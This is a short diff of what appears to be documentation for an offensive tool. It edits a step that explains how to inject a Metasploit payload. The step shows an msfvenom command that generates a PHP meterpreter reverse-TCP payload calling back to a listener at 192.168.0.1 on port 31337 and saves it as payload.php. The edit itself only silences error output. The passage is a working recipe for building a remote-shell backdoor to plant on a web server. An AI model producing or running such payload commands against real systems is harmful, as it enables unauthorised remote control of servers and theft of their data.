@@ -33,7 +33,7 @@ If you want to inject a metasploit payload, you have to do something like this:
 1. Create metasploit payload (i.e. php).
 ```sh
 $ msfvenom -p php/meterpreter_reverse_tcp \
-	LHOST=192.168.0.1 LPORT=31337 -f raw > payload.php
+	LHOST=192.168.0.1 LPORT=31337 -f raw 2>/dev/null > payload.php
 ```
 
 2. Edit `payload.php` if needed.
